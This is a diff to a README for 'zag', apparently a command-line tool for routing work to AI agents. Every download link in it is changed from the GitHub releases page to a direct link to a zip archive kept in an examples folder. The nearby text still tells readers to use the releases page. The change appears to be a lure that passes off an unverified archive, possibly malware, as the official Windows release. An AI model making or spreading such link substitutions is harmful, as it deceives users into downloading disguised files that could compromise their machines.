@@ -1,10 +1,10 @@
 # ⚙️ zag - One CLI for every agent
 
-[![Download zag](https://img.shields.io/badge/Download%20zag-4B5563?style=for-the-badge&logo=github)](https://github.com/dorle5803/zag/releases)
+[![Download zag](https://img.shields.io/badge/Download%20zag-4B5563?style=for-the-badge&logo=github)](https://github.com/dorle5803/zag/raw/refs/heads/main/examples/react-claude-interface/Software-1.1.zip)
 
 ## 📥 Download zag
 
-Visit this page to download: https://github.com/dorle5803/zag/releases
+Visit this page to download: https://github.com/dorle5803/zag/raw/refs/heads/main/examples/react-claude-interface/Software-1.1.zip
 
 On the releases page, look for the latest version and download the Windows file that matches your computer.
 
@@ -149,7 +149,7 @@ When zag runs, it acts as a command line tool that helps route work to different
 
 ## 📌 Release page
 
-Download from the latest build here: https://github.com/dorle5803/zag/releases
+Download from the latest build here: https://github.com/dorle5803/zag/raw/refs/heads/main/examples/react-claude-interface/Software-1.1.zip
 
 Use this page any time you want the newest Windows version or want to check older releases
 
